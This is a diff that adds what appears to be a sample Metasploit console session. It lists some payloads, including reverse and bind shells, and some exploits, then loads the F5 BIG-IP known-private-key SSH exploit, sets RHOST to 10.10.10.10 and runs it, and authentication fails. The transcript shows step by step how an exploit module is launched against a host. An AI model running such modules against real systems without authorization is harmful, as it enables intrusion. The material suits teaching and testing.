@@ -1,0 +1,47 @@
+       =[ metasploit v4.11.1-2015040202 [core:4.11.1.pre.2015040202 api:1.0.0]]
++ -- --=[ 1443 exploits - 901 auxiliary - 244 post        ]
++ -- --=[ 363 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > show payloads
+Name                                  Disclosure Date  Rank    Description
+android/meterpreter/reverse_http                       normal  Android Meterpreter, Dalvik Reverse HTTP Stager
+windows/x64/shell_bind_tcp                             normal  Windows x64 Command Shell, Bind TCP Inline
+linux/x64/shell_bind_tcp                               normal  Linux Command Shell, Bind TCP Inline
+
+msf > show exploit
+Name                                  Disclosure Date  Rank    Description
+windows/vnc/winvnc_http_get           2001-01-29       average    WinVNC Web Server GET Overflow
+linux/ssh/quantum_vmpro_backdoor      2014-03-17       excellent  Quantum vmPRO Backdoor Command
+msf > search ssh
+auxiliary/fuzzers/ssh/ssh_version_2                    normal     SSH 2.0 Version Fuzzer
+post/linux/gather/enum_network                         normal     Linux Gather Network Information
+
+msf > use exploit/linux/ssh/f5_bigip_known_privkey
+msf exploit(f5_bigip_known_privkey) > show options
+
+Module options (exploit/linux/ssh/f5_bigip_known_privkey):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  22               yes       The target port
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Universal
+
+msf exploit(f5_bigip_known_privkey) > set RHOST 10.10.10.10
+RHOST => 10.10.10.10
+msf exploit(f5_bigip_known_privkey) > run
+
+[-] 10.10.10.10:22 SSH - Failed authentication
